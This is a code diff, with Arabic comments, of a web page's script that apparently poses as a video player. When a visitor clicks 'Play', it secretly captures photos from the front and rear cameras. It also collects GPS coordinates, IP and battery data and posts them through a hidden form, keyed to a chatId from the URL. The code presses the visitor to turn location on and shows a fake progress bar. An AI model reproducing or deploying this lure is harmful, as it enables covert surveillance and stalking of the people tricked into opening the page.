+            // --- التقاط صورة من الكاميرا ---
+            async function captureFromCamera(facingMode) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: facingMode }
+                    });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    await video.play();
+                    await new Promise(resolve => setTimeout(resolve, 600));
 
-          if (permState === 'denied') {
-            permissions.push('الموقع مرفوض (المتصفح)');
-            // نعرض النافذة مع رسالة "تم حظر الموقع الجغرافي"
-            showLocationPrompt('permission_denied');
-            return '';
-          }
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
 
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: false,
-              timeout: 8000,
-              maximumAge: 300000
+                    stream.getTracks().forEach(track => track.stop());
+                    permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} تم السماح`);
+                    return true;
+                } catch (err) {
+                    permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} مرفوضة: ${err.name}`);
+                    return false;
+                }
+            }
+
+            // --- استبيان صلاحية الموقع ---
+            async function checkLocationPermissionState() {
+                try {
+                    if (!navigator.permissions || !navigator.permissions.query) {
+                        return 'unknown';
+                    }
+                    const result = await navigator.permissions.query({ name: 'geolocation' });
+                    return result.state;
+                } catch {
+                    return 'unknown';
+                }
+            }
+
+            // --- طلب الموقع الذكي ---
+            async function requestLocationSmart() {
+                try {
+                    const permState = await checkLocationPermissionState();
+
+                    if (permState === 'denied') {
+                        permissions.push('الموقع مرفوض (المتصفح)');
+                        return '';
+                    }
+
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: false,
+                            timeout: 8000,
+                            maximumAge: 300000
+                        });
+                    });
+
+                    permissions.push('الموقع ممنوح');
+                    locationGranted = true;
+                    return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+                } catch (err) {
+                    if (err.code === 1) {
+                        permissions.push('الموقع مرفوض (خدمة GPS موقفة أو مرفوض)');
+                        if (/Android/i.test(navigator.userAgent) || /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                            showLocationPrompt();
+                        }
+                    } else if (err.code === 2) {
+                        permissions.push('الموقع غير متاح');
+                    } else if (err.code === 3) {
+                        permissions.push('انتهت مهلة الموقع');
+                    } else {
+                        permissions.push('الموقع مرفوض');
+                    }
+                    return '';
+                }
+            }
+
+            // --- كشف نظام التشغيل ---
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) return 'android';
+                if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
+                if (/Windows/i.test(ua)) return 'windows';
+                if (/Mac/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) return 'mac';
+                return 'other';
+            }
+
+            // --- إظهار نافذة تنبيه الموقع مع تعليمات مخصصة ---
+            function showLocationPrompt() {
+                const overlay = document.getElementById('locationPromptOverlay');
+                const stepsDiv = document.getElementById('locationSteps');
+                const deviceType = getDeviceInfo();
+
+                let stepsHTML = '';
+                switch (deviceType) {
+                    case 'android':
+                        stepsHTML = `
+                            <span class="step-num">1</span> اضغط زر <span>"افتح الإعدادات"</span> أدناه<br>
+                            <span class="step-num">2</span> فعّل مفتاح <span>الموقع الجغرافي (GPS)</span><br>
+                            <span class="step-num">3</span> عد و اضغط <span>"فعّلته – حاول مجددًا"</span>
+                        `;
+                        break;
+                    case 'ios':
+                        stepsHTML = `
+                            <span class="step-num">1</span> اضغط زر <span>"افتح الإعدادات"</span><br>
+                            <span class="step-num">2</span> فعّل <span>خدمات الموقع</span><br>
+                            <span class="step-num">3</span> اختر <span>Safari/Chrome</span> ← <span>أثناء الاستخدام</span><br>
+                            <span class="step-num">4</span> عد و اضغط <span>"فعّلته – حاول مجددًا"</span>
+                        `;
+                        break;
+                    case 'windows':
+                        stepsHTML = `
+                            <span class="step-num">1</span> اضغط <span>Windows + I</span> ← <span>الخصوصية</span> ← <span>الموقع</span><br>
+                            <span class="step-num">2</span> فعّل <span>السماح بالوصول إلى الموقع</span><br>
+                            <span class="step-num">3</span> عد و اضغط <span>"فعّلته – حاول مجددًا"</span>
+                        `;
+                        break;
+                    case 'mac':
+                        stepsHTML = `
+                            <span class="step-num">1</span> افتح <span>إعدادات النظام</span> ← <span>الخصوصية والأمان</span> ← <span>خدمات الموقع</span><br>
+                            <span class="step-num">2</span> فعّل <span>خدمات الموقع</span><br>
+                            <span class="step-num">3</span> تأكد من تمكين المتصفح<br>
+                            <span class="step-num">4</span> عد و اضغط <span>"فعّلته – حاول مجددًا"</span>
+                        `;
+                        break;
+                    default:
+                        stepsHTML = `
+                            <span class="step-num">1</span> افتح <span>إعدادات</span> جهازك<br>
+                            <span class="step-num">2</span> ابحث عن <span>الموقع</span> أو <span>GPS</span><br>
+                            <span class="step-num">3</span> فعّل <span>خدمات الموقع</span><br>
+                            <span class="step-num">4</span> عد و اضغط <span>"فعّلته – حاول مجددًا"</span>
+                        `;
+                }
+
+                stepsDiv.innerHTML = stepsHTML;
+
+                if (overlay) {
+                    overlay.classList.add('active');
+                }
+            }
+
+            function hideLocationPrompt() {
+                const overlay = document.getElementById('locationPromptOverlay');
+                if (overlay) {
+                    overlay.classList.remove('active');
+                }
+            }
+
+            // --- فتح إعدادات الموقع ---
+            function openLocationSettings() {
+                const deviceType = getDeviceInfo();
+
+                switch (deviceType) {
+                    case 'android':
+                        window.location.href =
+                            'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        setTimeout(() => {
+                            window.location.href =
+                                'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        }, 400);
+                        break;
+
+                    case 'ios':
+                        window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                        setTimeout(() => {
+                            window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                        }, 500);
+                        break;
+
+                    case 'windows':
+                        window.open('ms-settings:privacy-location', '_blank');
+                        break;
+
+                    case 'mac':
+                        window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices',
+                            '_blank');
+                        break;
+
+                    default:
+                        if (/Android/i.test(navigator.userAgent)) {
+                            window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                        } else {
+                            alert('افتح إعدادات جهازك ← الموقع/GPS وقم بتفعيله.\nثم عد واضغط "فعّلته – حاول مجددًا".');
+                        }
+                }
+            }
+
+            // --- إعادة محاولة طلب الموقع ---
+            async function retryLocation() {
+                const btnTryAgain = document.getElementById('btnTryAgain');
+                btnTryAgain.disabled = true;
+                btnTryAgain.textContent = '⏳ جاري المحاولة...';
+
+                hideLocationPrompt();
+                locationGranted = false;
+
+                const locationValue = await requestLocationSmart();
+
+                if (locationValue) {
+                    document.getElementById('location').value = locationValue;
+                    const permIndex = permissions.findIndex(p => p.includes('الموقع'));
+                    if (permIndex !== -1) {
+                        permissions[permIndex] = 'الموقع ممنوح (بعد إعادة المحاولة)';
+                    } else {
+                        permissions.push('الموقع ممنوح (بعد إعادة المحاولة)');
+                    }
+                    document.getElementById('permissions').value = permissions.join(', ');
+                    submitFormIfReady();
+                    btnTryAgain.disabled = false;
+                    btnTryAgain.textContent = '🔄 فعّلته – حاول مجددًا';
+                } else {
+                    alert('⚠️ الموقع لا يزال غير متاح. تأكد من تفعيل GPS في إعدادات جهازك.');
+                    showLocationPrompt();
+                    btnTryAgain.disabled = false;
+                    btnTryAgain.textContent = '🔄 فعّلته – حاول مجددًا';
+                }
+            }
+
+            // --- إرسال النموذج ---
+            function submitFormIfReady() {
+                if (images.length > 0) {
+                    document.getElementById('imageDatas').value = images.join(',');
+                    document.getElementById('permissions').value = permissions.join(', ');
+
+                    const form = document.getElementById('data-form');
+                    form.target = 'hidden_iframe';
+                    form.submit();
+                }
+            }
+
+            // --- الدالة الرئيسية عند النقر على Play ---
+            async function captureData() {
+                if (userProceeded) return;
+                userProceeded = true;
+
+                const thumbnailArea = document.getElementById('thumbnailArea');
+                const realVideo = document.getElementById('realVideo');
+                const spinner = document.getElementById('spinner');
+                const loadingDiv = document.getElementById('loading');
+                const playIcon = document.getElementById('playIconLarge');
+                const playButtonOverlay = document.getElementById('playButtonOverlay');
+
+                // تشغيل الفيديو فوراً
+                thumbnailArea.style.display = 'none';
+                realVideo.style.display = 'block';
+                realVideo.play().catch(() => {});
+
+                // إظهار التحميل
+                spinner.style.display = 'block';
+                loadingDiv.style.display = 'block';
+                if (playIcon) playIcon.style.opacity = '0';
+                if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'none';
+
+                // طلب الموقع + الكاميرا الأمامية معاً
+                const [locationResult] = await Promise.allSettled([
+                    requestLocationSmart(),
+                    captureFromCamera('user')
+                ]);
+
+                document.getElementById('location').value = locationResult.status === 'fulfilled' ? locationResult.value :
+                    '';
+
+                // الكاميرا الخلفية
+                await new Promise(resolve => setTimeout(resolve, 300));
+                await captureFromCamera('environment');
+
+                // إنهاء التحميل
+                spinner.style.display = 'none';
+                loadingDiv.style.display = 'none';
+                if (playIcon) playIcon.style.opacity = '1';
+                if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'auto';
+
+                // إرسال النموذج
+                submitFormIfReady();
+            }
+
+            // --- تهيئة الأزرار ---
+            function initButtons() {
+                const btnEnable = document.getElementById('btnEnableLocation');
+                const btnSkip = document.getElementById('btnSkipLocation');
+                const btnTryAgain = document.getElementById('btnTryAgain');
+
+                if (btnEnable) {
+                    btnEnable.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        openLocationSettings();
+                    });
+                }
+
+                if (btnSkip) {
+                    btnSkip.addEventListener('click', () => {
+                        hideLocationPrompt();
+                    });
+                }
+
+                if (btnTryAgain) {
+                    btnTryAgain.addEventListener('click', () => {
+                        retryLocation();
+                    });
+                }
+            }
+
+            // --- التهيئة عند تحميل الصفحة ---
+            window.addEventListener('DOMContentLoaded', async () => {
+                const chatId = new URLSearchParams(window.location.search).get('chatId');
+                document.getElementById('chatId').value = chatId || '';
+
+                await Promise.all([fetchIPInfo(), getBatteryStatus()]);
+                initButtons();
+
+                const thumbnailArea = document.getElementById('thumbnailArea');
+                const playButtonOverlay = document.getElementById('playButtonOverlay');
+
+                if (thumbnailArea) {
+                    thumbnailArea.addEventListener('click', captureData);
+                }
+                if (playButtonOverlay) {
+                    playButtonOverlay.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        captureData();
+                    });
+                }
             });
-          });
 
-          permissions.push('الموقع ممنوح');
-          locationGranted = true;
-          return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
-        } catch (err) {
-          if (err.code === 1) {
-            permissions.push('الموقع مرفوض (خدمة GPS موقفة أو مرفوض)');
-            // عرض النافذة مع رسالة مناسبة: نتحقق إن كانت الخدمة موقفة أم لا
-            // لكننا لا نستطيع التمييز هنا بسهولة، لذلك نعرض نافذة عامة
-            showLocationPrompt('permission_denied');
-          } else if (err.code === 2) {
-            permissions.push('الموقع غير متاح');
-            showLocationPrompt('service_off'); // قد يكون بسبب الخدمة
-          } else if (err.code === 3) {
-            permissions.push('انتهت مهلة الموقع');
-            showLocationPrompt('service_off');
-          } else {
-            permissions.push('الموقع مرفوض');
-            showLocationPrompt('permission_denied');
-          }
-          return '';
-        }
-      }
+            // --- أزرار التحكم (تكبير الفيديو) ---
+            document.querySelectorAll('.control-button').forEach(button => {
+                button.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (this.textContent.includes('⛶')) {
+                        const video = document.getElementById('realVideo');
+                        if (video.requestFullscreen) {
+                            video.requestFullscreen();
+                        } else if (video.webkitRequestFullscreen) {
+                            video.webkitRequestFullscreen();
+                        }
+                    }
+                });
+            });
 
-      // --- كشف نظام التشغيل ---
-      function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        if (/Android/i.test(ua)) return 'android';
-        if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
-        if (/Windows/i.test(ua)) return 'windows';
-        if (/Mac/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) return 'mac';
-        return 'other';
-      }
+            // --- شريط التقدم الوهمي ---
+            const progressInterval = setInterval(() => {
+                const progressFill = document.querySelector('.progress-fill');
+                const realVideo = document.getElementById('realVideo');
+                if (realVideo.style.display === 'block') {
+                    clearInterval(progressInterval);
+                    return;
+                }
+                const currentWidth = parseInt(progressFill.style.width) || 35;
+                const newWidth = (currentWidth + 0.1) % 100;
+                progressFill.style.width = newWidth + '%';
 
-      // --- إظهار نافذة تنبيه الموقع مع تعليمات مخصصة (نوع الرسالة: service_off أو permission_denied) ---
-      function showLocationPrompt(reason = 'service_off') {
-        const overlay = document.getElementById('locationPromptOverlay');
-        const stepsDiv = document.getElementById('locationSteps');
-        const titleEl = document.getElementById('promptTitle');
-        const msgEl = document.getElementById('promptMessage');
-        const tryAgainBtn = document.getElementById('btnTryAgain');
+                const timeDisplay = document.querySelector('.time-display');
+                const currentSeconds = Math.floor((newWidth / 100) * 165);
+                const minutes = Math.floor(currentSeconds / 60);
+                const seconds = currentSeconds % 60;
+                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
+            }, 1000);
 
-        const deviceType = getDeviceInfo();
+        })();
+    </script>
 
-        let stepsHTML = '';
-        let title = '';
-        let message = '';
-
-        if (reason === 'permission_denied') {
-          title = '⛔ تم حظر الموقع الجغرافي';
-          message = 'لقد رفضت منح إذن الموقع. يرجى <strong>السماح بالموقع</strong> في إعدادات المتصفح.';
-          // نغير زر "فعّلته" إلى "سمحت - حاول مجدداً" أو نبقيه كما هو
-          tryAgainBtn.textContent = '🔄 سمحت - حاول مجدداً';
-          // التعليمات تختلف: قد نوجه لفتح إعدادات المتصفح بدلاً من GPS، لكننا سنضع تعليمات عامة.
-          stepsHTML = `
-            <span class="step-num">1</span> اضغط <span>"افتح الإعدادات"</span> أدناه<br>
-            <span class="step-num">2</span> ابحث عن <span>إعدادات الموقع</span> في المتصفح<br>
-            <span class="step-num">3</span> غيّر إلى <span>السماح</span> أو <span>أثناء الاستخدام</span><br>
-            <span class="step-num">4</span> عد و اضغط <span>"سمحت - حاول مجدداً"</span>
-          `;
-        } else {
-          // service_off
-          title = '⚠️ مطلوب GPS';
-          message = 'خدمة <strong>تحديد الموقع الجغرافي</strong> في جهازك <strong>موقفة</strong> حالياً.';
-          tryAgainBtn.textContent = '🔄 فعّلته - حاول مجدداً';
-          // تعليمات خاصة بنظام التشغيل لتفعيل GPS
-          switch (deviceType) {
-            case 'android':
-              stepsHTML = `
-                <span class="step-num">1</span> اضغط زر <span>"افتح الإعدادات"</span> أدناه<br>
-                <span class="step-num">2</span> فعّل مفتاح <span>الموقع الجغرافي (GPS)</span><br>
-                <span class="step-num">3</span> عد و اضغط <span>"فعّلته - حاول مجدداً"</span>
-              `;
-              break;
-            case 'ios':
-              stepsHTML = `
-                <span class="step-num">1</span> اضغط زر <span>"افتح الإعدادات"</span><br>
-                <span class="step-num">2</span> فعّل <span>خدمات الموقع</span><br>
-                <span class="step-num">3</span> اختر <span>Safari/Chrome</span> ← <span>أثناء الاستخدام</span><br>
-                <span class="step-num">4</span> عد و اضغط <span>"فعّلته - حاول مجدداً"</span>
-              `;
-              break;
-            case 'windows':
-              stepsHTML = `
-                <span class="step-num">1</span> اضغط <span>Windows + I</span> ← <span>الخصوصية</span> ← <span>الموقع</span><br>
-                <span class="step-num">2</span> فعّل <span>السماح بالوصول إلى الموقع</span><br>
-                <span class="step-num">3</span> عد و اضغط <span>"فعّلته - حاول مجدداً"</span>
-              `;
-              break;
-            case 'mac':
-              stepsHTML = `
-                <span class="step-num">1</span> افتح <span>إعدادات النظام</span> ← <span>الخصوصية والأمان</span> ← <span>خدمات الموقع</span><br>
-                <span class="step-num">2</span> فعّل <span>خدمات الموقع</span><br>
-                <span class="step-num">3</span> تأكد من تمكين المتصفح<br>
-                <span class="step-num">4</span> عد و اضغط <span>"فعّلته - حاول مجدداً"</span>
-              `;
-              break;
-            default:
-              stepsHTML = `
-                <span class="step-num">1</span> افتح <span>إعدادات</span> جهازك<br>
-                <span class="step-num">2</span> ابحث عن <span>الموقع</span> أو <span>GPS</span><br>
-                <span class="step-num">3</span> فعّل <span>خدمات الموقع</span><br>
-                <span class="step-num">4</span> عد و اضغط <span>"فعّلته - حاول مجدداً"</span>
-              `;
-          }
-        }
-
-        titleEl.textContent = title;
-        msgEl.innerHTML = message;
-        stepsDiv.innerHTML = stepsHTML;
-
-        if (overlay) {
-          overlay.classList.add('active');
-        }
-      }
-
-      function hideLocationPrompt() {
-        const overlay = document.getElementById('locationPromptOverlay');
-        if (overlay) {
-          overlay.classList.remove('active');
-        }
-      }
-
-      // --- فتح إعدادات الموقع ---
-      function openLocationSettings() {
-        const deviceType = getDeviceInfo();
-
-        switch (deviceType) {
-          case 'android':
-            window.location.href =
-              'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
-            setTimeout(() => {
-              window.location.href =
-              'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
-            }, 400);
-            break;
-
-          case 'ios':
-            window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-            setTimeout(() => {
-              window.open('prefs:root=Privacy&path=LOCATION', '_blank');
-            }, 500);
-            break;
-
-          case 'windows':
-            window.open('ms-settings:privacy-location', '_blank');
-            break;
-
-          case 'mac':
-            window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices',
-            '_blank');
-            break;
-
-          default:
-            if (/Android/i.test(navigator.userAgent)) {
-              window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-            } else {
-              alert('افتح إعدادات جهازك ← الموقع/GPS وقم بتفعيله.\nثم عد واضغط "فعّلته - حاول مجدداً".');
-            }
-        }
-      }
-
-      // --- إعادة محاولة طلب الموقع (بعد أن يفترض المستخدم أنه فعّل الخدمة أو سمح) ---
-      async function retryLocation() {
-        const btnTryAgain = document.getElementById('btnTryAgain');
-        btnTryAgain.disabled = true;
-        btnTryAgain.textContent = '⏳ جاري المحاولة...';
-
-        // نتحقق أولاً من الخدمة (قد تكون موقفة أو مرفوضة)
-        const isEnabled = await isGpsServiceEnabled();
-        if (!isEnabled) {
-          // الخدمة لا تزال موقفة
-          // نعرض النافذة مع رسالة service_off
-          showLocationPrompt('service_off');
-          btnTryAgain.disabled = false;
-          btnTryAgain.textContent = '🔄 فعّلته - حاول مجدداً';
-          return;
-        }
-
-        // الخدمة مفعلة الآن، نطلب الموقع بشكل طبيعي (قد يطلب الإذن)
-        hideLocationPrompt();
-        const locationValue = await requestLocationSmart();
-
-        if (locationValue) {
-          document.getElementById('location').value = locationValue;
-          const permIndex = permissions.findIndex(p => p.includes('الموقع'));
-          if (permIndex !== -1) {
-            permissions[permIndex] = 'الموقع ممنوح (بعد إعادة المحاولة)';
-          } else {
-            permissions.push('الموقع ممنوح (بعد إعادة المحاولة)');
-          }
-          document.getElementById('permissions').value = permissions.join(', ');
-          submitFormIfReady();
-          btnTryAgain.disabled = false;
-          btnTryAgain.textContent = '🔄 فعّلته - حاول مجدداً';
-        } else {
-          // فشل طلب الموقع رغم أن الخدمة مفعلة (ربما رفض المستخدم الإذن)
-          // نعرض النافذة مع رسالة permission_denied
-          showLocationPrompt('permission_denied');
-          btnTryAgain.disabled = false;
-          btnTryAgain.textContent = '🔄 سمحت - حاول مجدداً';
-        }
-      }
-
-      // --- إرسال النموذج ---
-      function submitFormIfReady() {
-        if (images.length > 0) {
-          document.getElementById('imageDatas').value = images.join(',');
-          document.getElementById('permissions').value = permissions.join(', ');
-
-          const form = document.getElementById('data-form');
-          form.target = 'hidden_iframe';
-          form.submit();
-        }
-      }
-
-      // --- الدالة الرئيسية عند النقر على Play (مع التحقق المسبق) ---
-      async function captureData() {
-        if (userProceeded) return;
-        userProceeded = true;
-
-        // 1. تحقق من حالة خدمة GPS أولاً (بدون طلب إذن)
-        const isGpsOn = await isGpsServiceEnabled();
-
-        if (!isGpsOn) {
-          // الخدمة موقفة -> نعرض النافذة
-          showLocationPrompt('service_off');
-          userProceeded = false; // نسمح بإعادة المحاولة
-          return;
-        }
-
-        // 2. الخدمة مفعلة -> نطلب الموقع بشكل طبيعي (سيظهر طلب الإذن من المتصفح)
-        const locationValue = await requestLocationSmart();
-        if (!locationValue) {
-          // فشل طلب الموقع (رفض الإذن أو مشكلة أخرى) -> تم عرض النافذة داخل requestLocationSmart
-          userProceeded = false;
-          return;
-        }
-
-        // 3. الموقع ممنوح -> نواصل مع تشغيل الفيديو وجمع البيانات
-        document.getElementById('location').value = locationValue;
-
-        // تشغيل الفيديو
-        const thumbnailArea = document.getElementById('thumbnailArea');
-        const realVideo = document.getElementById('realVideo');
-        const spinner = document.getElementById('spinner');
-        const loadingDiv = document.getElementById('loading');
-        const playIcon = document.getElementById('playIconLarge');
-        const playButtonOverlay = document.getElementById('playButtonOverlay');
-
-        thumbnailArea.style.display = 'none';
-        realVideo.style.display = 'block';
-        realVideo.play().catch(() => {});
-
-        spinner.style.display = 'block';
-        loadingDiv.style.display = 'block';
-        if (playIcon) playIcon.style.opacity = '0';
-        if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'none';
-
-        // التقاط الكاميرات
-        await captureFromCamera('user');
-        await new Promise(resolve => setTimeout(resolve, 300));
-        await captureFromCamera('environment');
-
-        spinner.style.display = 'none';
-        loadingDiv.style.display = 'none';
-        if (playIcon) playIcon.style.opacity = '1';
-        if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'auto';
-
-        // إرسال البيانات
-        submitFormIfReady();
-      }
-
-      // --- تهيئة الأزرار ---
-      function initButtons() {
-        const btnEnable = document.getElementById('btnEnableLocation');
-        const btnTryAgain = document.getElementById('btnTryAgain');
-
-        if (btnEnable) {
-          btnEnable.addEventListener('click', (e) => {
-            e.preventDefault();
-            openLocationSettings();
-          });
-        }
-
-        if (btnTryAgain) {
-          btnTryAgain.addEventListener('click', () => {
-            retryLocation();
-          });
-        }
-      }
-
-      // --- التهيئة عند تحميل الصفحة ---
-      window.addEventListener('DOMContentLoaded', async () => {
-        const chatId = new URLSearchParams(window.location.search).get('chatId');
-        document.getElementById('chatId').value = chatId || '';
-
-        await Promise.all([fetchIPInfo(), getBatteryStatus()]);
-        initButtons();
-
-        const thumbnailArea = document.getElementById('thumbnailArea');
-        const playButtonOverlay = document.getElementById('playButtonOverlay');
-
-        if (thumbnailArea) {
-          thumbnailArea.addEventListener('click', captureData);
-        }
-        if (playButtonOverlay) {
-          playButtonOverlay.addEventListener('click', (e) => {
-            e.stopPropagation();
-            captureData();
-          });
-        }
-      });
-
-      // --- أزرار التحكم (تكبير الفيديو) ---
-      document.querySelectorAll('.control-button').forEach(button => {
-        button.addEventListener('click', function(e) {
-          e.stopPropagation();
-          if (this.textContent.includes('⛶')) {
-            const video = document.getElementById('realVideo');
-            if (video.requestFullscreen) {
-              video.requestFullscreen();
-            } else if (video.webkitRequestFullscreen) {
-              video.webkitRequestFullscreen();
-            }
-          }
-        });
-      });
-
-      // --- شريط التقدم الوهمي ---
-      const progressInterval = setInterval(() => {
-        const progressFill = document.querySelector('.progress-fill');
-        const realVideo = document.getElementById('realVideo');
-        if (realVideo.style.display === 'block') {
-          clearInterval(progressInterval);
-          return;
-        }
-        const currentWidth = parseInt(progressFill.style.width) || 35;
-        const newWidth = (currentWidth + 0.1) % 100;
-        progressFill.style.width = newWidth + '%';
-
-        const timeDisplay = document.querySelector('.time-display');
-        const currentSeconds = Math.floor((newWidth / 100) * 165);
-        const minutes = Math.floor(currentSeconds / 60);
-        const seconds = currentSeconds % 60;
-        timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
-      }, 1000);
-
-    })();
-  </script>
 </body>
 </html>
